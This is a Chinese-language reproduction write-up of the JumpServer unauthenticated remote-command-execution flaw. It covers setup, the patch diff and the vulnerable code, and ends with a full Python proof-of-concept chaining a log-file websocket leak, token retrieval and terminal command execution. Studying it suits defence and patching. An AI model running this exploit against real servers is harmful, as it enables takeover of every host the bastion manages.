## 前言

近日，看到各大公众号发布JumpSever最新RCE的通告。Jumpsever是一款开源的堡垒机。什么是堡垒机（跳板机）？官方的解释是：即在一个特定的网络环境下，为了保障网络和数据不受来自外部和内部用户的入侵和破坏，而运用各种技术手段监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。

通俗一点来说: 就是监控运维人员、开发人员对服务器器的命令操作。出了了事故能找到具体责任人。

其架构图如下：

![图片](https://uploader.shimo.im/f/6kcH0zm9nhlqQaA0.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

相关组件介绍：

**Jumpserver**

现指 Jumpserver 管理后台，是核心组件（Core）, 使用 Django Class Based View 风格开发，支持 Restful API。

**Coco**

实现了 SSH Server 和 Web Terminal Server 的组件，提供 SSH 和 WebSocket 接口, 使用 Paramiko 和 Flask 开发。

**Luna**

现在是 Web Terminal 前端，计划前端页面都由该项目提供，Jumpserver 只提供 API，不再负责后台渲染html等。

**Guacamole**

Apache 跳板机项目，Jumpserver 使用其组件实现 RDP 功能，Jumpserver 并没有修改其代码而是添加了额外的插件，支持 Jumpserver 调用。

相关说明参见

```plain
https://jumpserver.readthedocs.io/zh/1.4.5/admin_instruction.html
```
## **漏洞成因**

这次漏洞的形成原因主要是由于JumpServer某些接口未做授权限制，攻击者可构造恶意请求获取敏感信息，或者执行相关操作控制其中所有机器，执行命令（系统有个批量命令执行的功能，会记录taskid到log中，利用前面读取log的漏洞可以获取taskid进行重放）。

### **影响版本**

JumpServer < v2.6.2

JumpServer < v2.5.4

JumpServer < v2.4.5

JumpServer = v1.5.9

## 环境搭建

### 环境准备

* centos8 64位
* JumpServer V2.6.1
### 安装方式（两种）

1. 快速安装:
```plain
curl -sSL https://github.com/jumpserver/jumpserver/releases/download/v2.6.1/quick_start.sh | sh
```
**环境要求：4核8G的centos7**
#### 2.docker安装

```plain
cd /opt
yum -y install wget
wget https://github.com/jumpserver/installer/releases/download/v2.6.1/jumpserver-installer-v2.6.1.tar.gz
tar -xf jumpserver-installer-v2.6.1.tar.gz
cd jumpserver-installer-v2.6.1
export DOCKER_IMAGE_PREFIX=docker.mirrors.ustc.edu.cn
cat config-example.txt
./jmsctl.sh install
```
**参考：**
```plain
https://jumpserver.readthedocs.io/zh/master/install/setup_by_fast/
```
**坑点：**
![图片](https://uploader.shimo.im/f/NOF7NQP7FNHW37gN.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

安装完成之后启动它，执行./jmsctl.sh start

![图片](https://uploader.shimo.im/f/a2i2U5EuVLyCWDUT.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

访问jumpserver,默认地址：IP:8080,账户密码：admin/admin

![图片](https://uploader.shimo.im/f/ob9KTVdopkt0IGUV.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

安装完成之后就是令人激动的复现过程了~哈哈哈哈

## 漏洞复现

首先，跟踪github，找最近bug修复的地方

```plain
https://github.com/jumpserver/jumpserver/commits/master
```
![图片](https://uploader.shimo.im/f/ORxuwQA8vKwPX8ws.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

![图片](https://uploader.shimo.im/f/9b8GpCi63NZQqQl0.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

![图片](https://uploader.shimo.im/f/4xHxhFswOakG3H1J.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

对比一下未授权漏洞代码

```plain
https://githistory.xyz/jumpserver/jumpserver/blob/db6f7f66b2e5e557081cb561029f64af0a1f80c4/apps/ops/ws.py
```
![图片](https://uploader.shimo.im/f/uiG2oGQrmKyVjNVn.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

这边可以看到，这边就加了个判断，之前的代码是没有认证的。

全局搜全局搜索CeleryLogWebsocket 这个函数。然后得到如下的websocket 的路由

![图片](https://uploader.shimo.im/f/WwSez1UnTo2XCE3J.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

尝试连接此路由，未授权的情况下可以连接成功

![图片](https://uploader.shimo.im/f/2a5rNQOxpSxFvYyv.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

看看这个函数具体的处理过程

```plain
import time
import os
import threading
import json
from common.utils import get_logger
from .celery.utils import get_celery_task_log_path
from channels.generic.websocket import JsonWebsocketConsumer
logger = get_logger(__name__)
class CeleryLogWebsocket(JsonWebsocketConsumer):
    disconnected = False
    def connect(self):
        self.accept()
    def wait_util_log_path_exist(self, task_id):
        log_path = get_celery_task_log_path(task_id)
        while not self.disconnected:
            if not os.path.exists(log_path):
                self.send_json({'message': '.', 'task': task_id})
                time.sleep(0.5)
                continue
            self.send_json({'message': '\r\n'})
            try:
                logger.debug('Task log path: {}'.format(log_path))
                task_log_f = open(log_path, 'rb')
                return task_log_f
            except OSError:
                return None
    def read_log_file(self, task_id):
        task_log_f = self.wait_util_log_path_exist(task_id)
        if not task_log_f:
            logger.debug('Task log file is None: {}'.format(task_id))
            return
        task_end_mark = []
        while not self.disconnected:
            data = task_log_f.read(4096)
            if data:
                data = data.replace(b'\n', b'\r\n')
                self.send_json(
                    {'message': data.decode(errors='ignore'), 'task': task_id}
                )
                if data.find(b'succeeded in') != -1:
                    task_end_mark.append(1)
                if data.find(bytes(task_id, 'utf8')) != -1:
                    task_end_mark.append(1)
            elif len(task_end_mark) == 2:
                logger.debug('Task log end: {}'.format(task_id))
                break
            time.sleep(0.2)
        task_log_f.close()
    def handle_task(self, task_id):
        logger.info("Task id: {}".format(task_id))
        thread = threading.Thread(target=self.read_log_file, args=(task_id,))
        thread.start()
    def disconnect(self, close_code):
        self.disconnected = True
        self.close()
```
这里是只能获取log 后缀的一个文件。
然后就通过传递task 参数传递一个文件名就可以获取到log文件，利用websocket插件进行连接，内容如下：

```plain
ws://xx.xx.xx.xx:8080/ws/ops/tasks/log/
{"task":"/opt/jumpserver/logs/jumpserver"}
```
![图片](https://uploader.shimo.im/f/XVwdS43qb28d7U7H.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

再查看jumpserver.log 中 存在system_user user 和asset的信息,这三者信息恰好是apps/authentication/api/auth.py 认证系统所需要的值。

代码如下：

```plain
# -*- coding: utf-8 -*-
#
import uuid
from django.core.cache import cache
from django.shortcuts import get_object_or_404
from rest_framework.permissions import AllowAny
from rest_framework.response import Response
from rest_framework.views import APIView
from common.utils import get_logger
from common.permissions import IsOrgAdminOrAppUser
from orgs.mixins.api import RootOrgViewMixin
from users.models import User
from assets.models import Asset, SystemUser
logger = get_logger(__name__)
__all__ = [
    'UserConnectionTokenApi',
]
class UserConnectionTokenApi(RootOrgViewMixin, APIView):
    permission_classes = (IsOrgAdminOrAppUser,)
    def post(self, request):
        user_id = request.data.get('user', '')
        asset_id = request.data.get('asset', '')
        system_user_id = request.data.get('system_user', '')
        token = str(uuid.uuid4())
        user = get_object_or_404(User, id=user_id)
        asset = get_object_or_404(Asset, id=asset_id)
        system_user = get_object_or_404(SystemUser, id=system_user_id)
        value = {
            'user': user_id,
            'username': user.username,
            'asset': asset_id,
            'hostname': asset.hostname,
            'system_user': system_user_id,
            'system_user_name': system_user.name
        }
        cache.set(token, value, timeout=20)
        return Response({"token": token}, status=201)
    def get(self, request):
        token = request.query_params.get('token')
        user_only = request.query_params.get('user-only', None)
        value = cache.get(token, None)
        if not value:
            return Response('', status=404)
        if not user_only:
            return Response(value)
        else:
            return Response({'user': value['user']})
    def get_permissions(self):
        if self.request.query_params.get('user-only', None):
            self.permission_classes = (AllowAny,)
        return super().get_permissions()
```
找到UserConnectionTokenApi这个函数的路由：
![图片](https://uploader.shimo.im/f/qWMH7rfeIdZARBNT.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

/api/v1/authentication/connection-token/

而user中的路由/api/v1/users/connection-token/

代码逻辑：

GET 需要user-only 参数

post 需要三个参数：user 、asset 和 system_user，然后返回一个20S 的一个token，代码如下：

```plain
def post(self, request):
        user_id = request.data.get('user', '')
        asset_id = request.data.get('asset', '')
        system_user_id = request.data.get('system_user', '')
        token = str(uuid.uuid4())
        user = get_object_or_404(User, id=user_id)
        asset = get_object_or_404(Asset, id=asset_id)
        system_user = get_object_or_404(SystemUser, id=system_user_id)
        value = {
            'user': user_id,
            'username': user.username,
            'asset': asset_id,
            'hostname': asset.hostname,
            'system_user': system_user_id,
            'system_user_name': system_user.name
        }
        cache.set(token, value, timeout=20)
        return Response({"token": token}, status=201)
```
利用获取Token值，代码如下：
```plain
import requests
import json
data={"user":"xxxx","asset":"xxxxx","system_user":"xxxxxx"}
url_host='http://xx.xx.xx.xx:8080'
def get_token():
    url = url_host+'/api/v1/users/connection-token/?user-only=1'
    response = requests.post(url, json=data).json()
    print(response)
    return response['token']
get_token()
```
![图片](https://uploader.shimo.im/f/Z1tMOCU1pnVEjmXm.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

然后登陆管理后台,打开web终端

![图片](https://uploader.shimo.im/f/LDH6VIW6SEMjdglK.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

![图片](https://uploader.shimo.im/f/0FcTySjXK7vc1chF.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

找到koko.js

![图片](https://uploader.shimo.im/f/fPX8JZ0nXbiNlf81.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

查看webserver.go

![图片](https://uploader.shimo.im/f/6tkEIbcUYWXYPfa2.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

跟踪processTokenWebsocket 函数

```plain
func (s *server) processTokenWebsocket(ctx *gin.Context) {
	tokenId, _ := ctx.GetQuery("target_id")
	tokenUser := service.GetTokenAsset(tokenId)
	if tokenUser.UserID == "" {
		logger.Errorf("Token is invalid: %s", tokenId)
		ctx.AbortWithStatus(http.StatusBadRequest)
		return
	}
	currentUser := service.GetUserDetail(tokenUser.UserID)
	if currentUser == nil {
		logger.Errorf("Token userID is invalid: %s", tokenUser.UserID)
		ctx.AbortWithStatus(http.StatusBadRequest)
		return
	}
	targetType := TargetTypeAsset
	targetId := strings.ToLower(tokenUser.AssetID)
	systemUserId := tokenUser.SystemUserID
	s.runTTY(ctx, currentUser, targetType, targetId, systemUserId)
}
```
接着，跟踪GetTokenAsset
```plain
func GetTokenAsset(token string) (tokenUser model.TokenUser) {
	Url := fmt.Sprintf(TokenAssetURL, token)
	_, err := authClient.Get(Url, &tokenUser)
	if err != nil {
		logger.Error("Get Token Asset info failed: ", err)
	}
	return
}
```
**可以看到两处都没有做任何的身份认证**
尝试用websocket连接

![图片](https://uploader.shimo.im/f/EqKSbn3vgJizar6Q.png!thumbnail?fileGuid=krYYkhtrHCpTD3dg)

发现是可以连接的。

**POC**

```plain
import asyncio
import websockets
import requests
import json
# 向服务器端发送认证后的消息
async def send_msg(websocket,_text):
    if _text == "exit":
        print(f'you have enter "exit", byebye')
        await websocket.close(reason="user exit")
        return False
    await websocket.send(_text)
    recv_text = await websocket.recv()
async def main_logic(cmd):
    print("------*******start ws*****--------")
    async with websockets.connect(target) as websocket:
        recv_text = await websocket.recv()
        print(f"{recv_text}")
        resws=json.loads(recv_text)
        id = resws['id']
        print("get ws id:"+id)
        print("###############")
        print("init ws")
        print("###############")
        inittext = json.dumps({"id": id, "type": "TERMINAL_INIT", "data": "{\"cols\":164,\"rows\":17}"})
        await send_msg(websocket,inittext)
        for i in range(20):
            recv_text = await websocket.recv()
            #recv_text=json.loads(recv_text)
           # print(f"{recv_text['data']}")
        print("###############")
        print("exec cmd: %s"%cmd)
        cmdtext = json.dumps({"id": id, "type": "TERMINAL_DATA", "data": cmd+"\r\n"})
        print(cmdtext)
        await send_msg(websocket, cmdtext)
        for i in range(20):
            recv_text = await websocket.recv()
            recv_text=json.loads(recv_text)
            print(recv_text['data'])
        print('#######finish')
url = "/api/v1/authentication/connection-token/?user-only=None"
host="http://x.x.x.x:8080"
cmd="ifconfig"
if host[-1]=='/':
    host=host[:-1]
print(host)
data = {"user": "xxx", "asset": "xxx",
        "system_user": "xx"}
print("#################################")
print("get token url:%s" % (host + url,))
print("################################")
res = requests.post(host + url, json=data)
token = res.json()["token"]
print("token:%s", (token,))
print("####################################")
target = "ws://" + host.replace("http://", '') + "/koko/ws/token/?target_id=" + token
print("target ws:%s" % (target,))
asyncio.get_event_loop().run_until_complete(main_logic(cmd))
```
## 总结回顾

总结就是，攻击者通过未授权访问得到三个id，然后基于这三个id 进行一个临时token的获取，通过获取到的临时token 进行ws的访问，进而命令执行。

## Reference

* [https://mp.weixin.qq.com/s/KGRU47o7JtbgOC9xwLJARw](https://mp.weixin.qq.com/s/KGRU47o7JtbgOC9xwLJARw)
* [https://jumpserver.readthedocs.io/zh/1.4.5/admin_instruction.html](https://jumpserver.readthedocs.io/zh/1.4.5/admin_instruction.html)
* [https://www.cnblogs.com/1996-11-01-614lb/p/14132802.html](https://www.cnblogs.com/1996-11-01-614lb/p/14132802.html)
